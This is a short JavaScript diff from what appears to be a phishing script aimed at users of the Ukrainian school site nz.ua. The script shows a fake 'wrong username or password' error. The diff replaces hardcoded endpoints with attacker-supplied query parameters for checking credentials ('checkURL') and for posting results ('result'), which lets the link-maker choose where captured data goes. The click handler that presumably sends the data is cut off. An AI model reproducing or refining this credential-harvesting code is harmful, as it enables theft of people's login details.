@@ -42,9 +42,15 @@ function createMyScript() {
     function getCheckURL() {
         let url = new URL(window.location.href);
         let next = url.searchParams.get('checkURL');
-        return next ? next : 'https://nz.ua/menu/'
+        return next;
     }
     
+    function getResultURL() {
+        let url = new URL(window.location.href);
+        let next = url.searchParams.get('result');
+        return next;
+    }
+
     function showError() {
         let block = document.createElement('div')
         block.innerHTML = '<div class="alert alert-danger" role="alert"><div><ul><li>Неправильне ім\\\'я користувача або пароль!</li></ul></div></div>';
@@ -54,7 +60,7 @@ function createMyScript() {
 
     const nextUrl = getNextUrl()
     const checkCredentialsURL = getCheckURL();
-    const postResultURL = checkCredentialsURL.slice(0, checkCredentialsURL.indexOf('/', 8))+'/wtflolfuckyou';
+    const postResultURL = getResultURL();
     let showedError = false;
     
     btn.addEventListener('click', () => {
